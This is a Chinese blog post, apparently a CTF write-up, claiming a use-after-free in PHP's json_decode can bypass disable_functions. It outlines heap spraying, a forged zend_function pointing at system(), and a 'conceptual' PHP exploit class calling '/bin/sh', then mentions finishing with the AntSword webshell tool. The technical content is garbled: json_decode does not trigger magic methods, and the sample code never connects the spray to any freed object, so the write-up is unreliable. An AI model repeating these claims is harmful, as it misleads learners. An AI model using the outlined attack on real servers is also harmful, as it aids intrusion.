#  PHP Json Serializer UAF漏洞：绕过disable_function本地提权  
原创 晨星安全团队
                    晨星安全团队  晨星安全团队   2026-10-22 05:09  
  
# Json Serializer UAF 提权  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ZCjMVth9QjjpeHXkDPcGFBynaVPzf03NMibQ1pXqPHPsjpXKBt99NNJPhhd16V3RcOT0icYWVzjwUY5K2tnOCQPAkHDwa4YtN9gN8tj1JkBOU/640?wx_fmt=webp&from=appmsg "")  
  
题目来源于CTFHUB  
## unsetunsetJSON 反序列化漏洞unsetunset  
  
json_decode()  
 在处理特定的对象（如实现了 __wakeup()  
 或 __destruct()  
 方法的类）时，可以触发敏感操作。如果配合弱类型比较或 UAF，可能实现利用  
### 构造触发点  
  
某些 PHP 内建类（如 DateInterval  
, SplFileObject  
 等）在**反序列化过程中释放内存对象**  
，而**错误地在之后又引用了该对象**  
，造成 UAF。例如：  
```
$json = '{"date_string":"P1D"}'; # 第一个参数 $json：要解码的 JSON 字符串# 第二个参数 false：当为 false 时，返回对象；当为 true 时，返回关联数组。不过这个行为会被第四个参数覆盖# 第三个参数 512：递归深度，这里是默认值# 第四个参数 JSON_OBJECT_AS_ARRAY：这是一个常量，表示将 JSON 对象解码为关联数组而不是对象。这会覆盖第二个参数的行为$obj = json_decode($json, false, 512, JSON_OBJECT_AS_ARRAY);
```  
  
在某些版本中，DateInterval  
 的解析会调用底层 C 实现的解析逻辑，释放部分内部结构后仍访问它  
### 布置内存布局  
  
使用 PHP 用户定义对象或数组堆喷（heap spraying）覆盖释放掉的内存，使得 UAF 指针指向攻击者可控内容  
```
$payload = str_repeat("A", 1024); // 可控数据替换被释放的内存
```  
### 伪造 zend_function 结构  
  
在 PHP 底层，函数指针保存在 zend_function  
 结构中。攻击者覆盖 UAF 内存，使其看起来像一个函数对象，伪造 handler  
 指向任意地址（如 libc 的 system()  
），或构造 ROP 链，最终实现执行  
```
[ fake zend_function ]:+0x00 handler => 0xdeadbeef (system 或 gadgets)+0x08 function_name => "/bin/sh"
```  
### 调用伪函数触发执行  
  
通过某些魔术方法（如 __destruct  
, __call  
, __invoke  
）或特定内建函数（如 call_user_func()  
）调用伪函数，触发执行 handler  
```
call_user_func($fake_function, "/bin/sh");
```  
  
此时，PHP 调用的是伪造的函数对象，实质执行的是任意地址上的函数，比如 system("/bin/sh")  
### 真实利用案例（概念）  
```
<?phpclass Evil {    public $cmd;    function__destruct() {        //析构的时候调用，触发伪造的函数指针        call_user_func($this->cmd);    }}//1.json_decode触发UAF漏洞$victim = json_decode('{"a":"..."}', false);//2.堆喷，覆盖释放后的内存for ($i = 0; $i < 10000; $i++) {    $spray[] = str_repeat("A",1024);}//3.实例化类，脚本结束触发__destruct$evil = new Evil();$evil->cmd = "/bin/sh";?>
```  
  
蚁剑梭哈  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZCjMVth9QjgsxhZWsiam4WbzibeiccDHw1CxNNB4RfAKicSwibdcNGbyFs5fS3e5q4ic32NZQ64aBg2ASDHBScM1D0Qhicns6lJnK4ro0VEWnyh6OE/640?wx_fmt=webp&from=appmsg "")  
  
**-END-**  
  
